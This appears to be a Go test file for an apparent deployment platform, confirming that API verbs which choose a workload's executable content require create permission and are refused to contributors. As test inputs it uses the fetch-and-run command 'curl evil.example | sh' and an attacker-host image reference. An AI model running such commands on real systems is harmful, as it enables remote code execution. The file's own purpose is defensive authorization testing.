/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package api

import (
	"context"
	"errors"
	"testing"

	"github.com/bex-co/bex/lego/backend/internal/apps"
	"github.com/bex-co/bex/lego/backend/internal/core"
	"github.com/bex-co/bex/lego/backend/internal/deploys"
	"github.com/bex-co/bex/lego/backend/internal/jobs"
)

// w1/m68 F2 — the executable-selection class, enumerated.
//
// This exists because the class was fixed HALF-WAY once. The codex #1 pass
// upgraded SetCommands/SetSource/SetSourceAndRegistryCredential (and the agent
// session verbs) from can_operate to can_create on the reasoning that choosing
// the code a workload runs is create-like, not lifecycle — and left four
// siblings reaching the identical sink on can_operate. Nothing failed, because
// the pins it did add read as evidence the class had been handled.
//
// So the unit under test here is the CLASS, not the four verbs: every way an API
// caller can select the executable content of a workload, in one table, each
// paired with the lifecycle call it must NOT be confused with. A new
// executable-selection verb that is not added here is the failure mode this file
// exists to make expensive — see TestExecutableSelectionClassIsComplete below.
//
// The reflection sweep in roleladder_test.go cannot cover this: it invokes verbs
// with zero-valued arguments, so for the two CONDITIONAL verbs (Trigger,
// SetCronJob) it only ever observes the lifecycle branch.
//
// WHERE THE CLASS ENDS. A verb is in it when the API accepts code from OUTSIDE
// the service's already-approved source: an arbitrary command string, an
// arbitrary image reference, an arbitrary commit to resurrect. Verbs that only
// select among content already inside the approved repo at the approved
// revision are build configuration, not executable selection, and stay on
// can_operate — SetRootDir and SetDockerfilePath were both examined for this
// pass and deliberately left as lifecycle on that reasoning. The line matters
// because it is what a future reviewer needs in order to place a new verb, and
// because bex's role boundary cannot govern repo contents anyway: a contributor
// with git write already changes the code that auto-deploys. What bex CAN
// govern is what it accepts as input, which is exactly this class.

// execSelectionCase is one call into the class: how to invoke it, and the
// relation that call must gate on.
type execSelectionCase struct {
	name string
	// selectsExecutable records the semantic claim being made, independent of
	// what the verb checks — the same independence trick representativeVerbRelations
	// uses. want is derived from it, so a case cannot silently assert the
	// current behavior.
	selectsExecutable bool
	invoke            func(ctx context.Context, base *core.Base) error
}

func (c execSelectionCase) want() string {
	if c.selectsExecutable {
		return core.RelCanCreate
	}
	return core.RelCanOperate
}

func strp(s string) *string { return &s }

// execSelectionCases is the class. Each entry either supplies executable content
// (⇒ can_create, developer and up) or is the parameter-free lifecycle call on
// the same verb (⇒ can_operate, contributor and up).
func execSelectionCases() []execSelectionCase {
	return []execSelectionCase{{
		name:              "pre-deploy command",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&apps.Service{Base: base}).SetPreDeployCommand(ctx, "web", "curl evil.example | sh")
			return err
		},
	}, {
		// Clearing the command still changes what executes, so it is create-like
		// too — the gate is on supplying the field, not on its value.
		name:              "pre-deploy command, cleared",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&apps.Service{Base: base}).SetPreDeployCommand(ctx, "web", "")
			return err
		},
	}, {
		name:              "cron command",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&apps.Service{Base: base}).SetCronJob(ctx, "web", nil, strp("curl evil.example | sh"))
			return err
		},
	}, {
		name:              "cron schedule only (lifecycle: WHEN it runs, not WHAT)",
		selectsExecutable: false,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&apps.Service{Base: base}).SetCronJob(ctx, "web", strp("0 * * * *"), nil)
			return err
		},
	}, {
		name:              "one-off job command",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&jobs.Service{Base: base}).Create(ctx, "web", "curl evil.example | sh", "")
			return err
		},
	}, {
		name:              "deploy trigger with imageUrl",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&deploys.Service{Base: base}).Trigger(ctx, "web", deploys.TriggerParams{ImageURL: "evil.example/x:latest"})
			return err
		},
	}, {
		name:              "deploy trigger with commitId",
		selectsExecutable: true,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&deploys.Service{Base: base}).Trigger(ctx, "web", deploys.TriggerParams{CommitID: "deadbeef"})
			return err
		},
	}, {
		name:              "bare deploy trigger (lifecycle: redeploy the approved artifact)",
		selectsExecutable: false,
		invoke: func(ctx context.Context, base *core.Base) error {
			_, err := (&deploys.Service{Base: base}).Trigger(ctx, "web", deploys.TriggerParams{})
			return err
		},
	}}
}

// TestExecutableSelectionRequiresCanCreate pins the relation each call in the
// class gates on. It fails on the pre-m68 code for the five create-like cases
// (all of which gated on can_operate) and would fail again if either
// conditional verb's lifecycle branch were over-tightened into can_create,
// which would take a legitimate contributor capability away.
func TestExecutableSelectionRequiresCanCreate(t *testing.T) {
	ctx := core.WithIdentity(context.Background(), core.Identity{Subject: "client-1", Method: "oauth2"})
	for _, tc := range execSelectionCases() {
		t.Run(tc.name, func(t *testing.T) {
			rec := &recordingChecker{decide: func(string) bool { return true }}
			base := &core.Base{Client: fakeClient(sampleApp("web")), Namespace: "default", Authz: rec}

			// The verb may fail after the gate (a non-cron App, an absent job
			// store); the relation it checked is what this asserts, and it is
			// recorded before any of that.
			_ = tc.invoke(ctx, base)

			got := distinct(rec.relations)
			if len(got) != 1 || got[0] != tc.want() {
				t.Errorf("%s gated on %v, want exactly [%s]", tc.name, got, tc.want())
			}
		})
	}
}

// TestContributorCannotSelectExecutables is the same table read as the attack:
// a contributor — who holds can_operate and can_view_logs but not can_create —
// is refused every call that chooses code, and keeps both lifecycle calls.
// This is the assertion that states the product rule: the contributor role is
// not a code-execution role.
func TestContributorCannotSelectExecutables(t *testing.T) {
	ctx := core.WithIdentity(context.Background(), core.Identity{Subject: "client-1", Method: "oauth2"})
	contributor := roleGrants["contributor"]
	if contributor[core.RelCanCreate] {
		t.Fatal("fixture wrong: a contributor must not hold can_create, or this test proves nothing")
	}
	if !contributor[core.RelCanOperate] {
		t.Fatal("fixture wrong: a contributor must hold can_operate")
	}

	for _, tc := range execSelectionCases() {
		t.Run(tc.name, func(t *testing.T) {
			chk := &recordingChecker{decide: func(rel string) bool { return contributor[rel] }}
			base := &core.Base{Client: fakeClient(sampleApp("web")), Namespace: "default", Authz: chk}

			err := tc.invoke(ctx, base)
			forbidden := errors.Is(err, core.ErrForbidden)

			if tc.selectsExecutable && !forbidden {
				t.Errorf("contributor was NOT refused %q — err=%v; this is arbitrary code execution "+
					"with the service's secrets and network identity", tc.name, err)
			}
			if !tc.selectsExecutable && forbidden {
				t.Errorf("contributor was refused the lifecycle call %q — over-tightening removes a "+
					"legitimate contributor capability", tc.name)
			}
		})
	}
}

// TestExecutableSelectionClassIsComplete is the anti-recurrence guard, and the
// real point of this file. F2 happened because five verbs of a class were fixed
// and four were not; the defense is to make the class enumerable and require
// every member of it to be present here.
//
// It cross-checks the table against representativeVerbRelations: every verb
// pinned there at can_create for the executable-selection reason must appear in
// this table. A future verb that persists a command, an image, or a commit is
// expected to be added to BOTH — and if it is added to the pins alone, this
// fails and says so.
func TestExecutableSelectionClassIsComplete(t *testing.T) {
	// The verbs whose can_create pin exists for the executable-selection reason.
	// Keep in sync with the SECURITY comments on each method.
	wantCovered := map[string]string{
		"*apps.Service.SetPreDeployCommand": "pre-deploy command",
		"*apps.Service.SetCronJob":          "cron command",
		"*jobs.Service.Create":              "one-off job command",
		"*deploys.Service.Trigger":          "deploy trigger with imageUrl",
	}

	covered := map[string]bool{}
	for _, tc := range execSelectionCases() {
		covered[tc.name] = true
	}
	for verb, caseName := range wantCovered {
		if !covered[caseName] {
			t.Errorf("verb %s is in the executable-selection class but its case %q is missing from "+
				"execSelectionCases — a class member outside the table is how F2 survived round 4",
				verb, caseName)
		}
	}

	// And the converse direction: every create-like case must correspond to a
	// verb the pins table also knows about, so the two cannot drift apart.
	for _, tc := range execSelectionCases() {
		if !tc.selectsExecutable {
			continue
		}
		var found bool
		for _, caseName := range wantCovered {
			if caseName == tc.name {
				found = true
				break
			}
		}
		// Variants of an already-pinned verb (cleared command, commitId) are
		// deliberately not separate pins; they share their verb's entry.
		if !found && tc.name != "pre-deploy command, cleared" && tc.name != "deploy trigger with commitId" {
			t.Errorf("case %q selects an executable but maps to no pinned verb — add it to "+
				"representativeVerbRelations so the reflection guard covers it too", tc.name)
		}
	}
}
